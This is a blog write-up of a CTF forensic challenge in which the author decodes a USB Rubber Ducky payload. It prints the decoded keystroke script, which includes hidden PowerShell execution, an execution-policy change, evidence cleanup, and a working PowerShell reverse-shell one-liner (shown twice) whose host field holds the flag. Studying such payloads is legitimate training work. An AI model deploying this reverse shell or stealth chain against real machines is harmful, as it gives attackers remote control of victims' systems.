---
title: "Writeup Cyber Threat Force : Like a duck in water"
date: 2021-07-11T09:24:09+01:00
draft: false
tags: ["blog", "security", "ctf", "cyber-threat-force", "forensic"]
type: "posts"
showDate: true
---

Note: I did not solve this challenge during the CTF, but my teammate [Lukho](https://twitter.com/lukhooo) did.

For this challenge, we were given an `inject.bin` file, which contains an encoded [Rubber Ducky](https://hak5.org/products/usb-rubber-ducky-deluxe) payload. We can use the [Duck Toolkit](https://ducktoolkit.com/encode) to get back the original code:

```text
DELAY
DELAY
powershell Start-Process notepad -Verb runAsENTER
DELAY
DELAY
ENTER
DELAY
mDELAY
DOWNARROW
...
DOWNARROW
ENTER
$folderDateTime = (get-date).ToString('d-M-y HHmmss')ENTER
...
Add-Content "$env:TEMP\72794.ps1" '$c = New-Object System.Net.Sockets.TCPClient("CYBERTF{D0N4LD_DUC|<}",443);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + "PS " + (pwd).Path + "> ";$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'ENTER
start-Process powershell.exe -windowstyle hidden "$env:TEMP\72794.ps1"ENTER
$Report >> $fileSaveDir'/ComputerInfo.html'ENTER
function copy-ToZip($fileSaveDir){ENTER
$srcdir = $fileSaveDirENTER
$zipFile = 'C:\Windows\Temp\report.txt\Report.zip'ENTER
if(-not (test-path($zipFile))) {ENTER
set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))ENTER
(dir $zipFile).IsReadOnly = $false}ENTER
$shellApplication = new-object -com shell.applicationENTER
$zipPackage = $shellApplication.NameSpace($zipFile)ENTER
$files = Get-ChildItem -Path $srcdirENTER
foreach($file in $files) {ENTER
$zipPackage.CopyHere($file.FullName)ENTER
while($zipPackage.Items().Item($file.name) -eq $null){ENTER
Start-sleep -seconds 1 }}}ENTER
copy-ToZip($fileSaveDir)ENTER
remove-item $fileSaveDir -recurseENTER
Remove-Item $MyINvocation.InvocationNameENTER
DELAY
C:\Windows\config-72794.ps1ENTER
DELAY
DELAY
DELAY
powershell Start-Process cmd -Verb runAsENTER
DELAY
DELAY
mode con:cols=14 lines=1ENTER
DELAY
mDELAY
DOWNARROW
...
DOWNARROW
ENTER
powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$falseENTER
DELAY
powershell.exe -windowstyle hidden -File C:\Windows\config-72794.ps1ENTER
```

We can see that last powershell command, which launches a file that was previously written. The content of that file is:

```powershell
$c = New-Object System.Net.Sockets.TCPClient("CYBERTF{D0N4LD_DUC|<}",443);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + "PS " + (pwd).Path + "> ";$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
```

The flag is `CYBERTF{D0N4LD_DUC|<}`.

You can [view the sources on github](https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/like-a-duck-in-water) or [read other writeups](/blog/cyber-threat-force-ctf/).
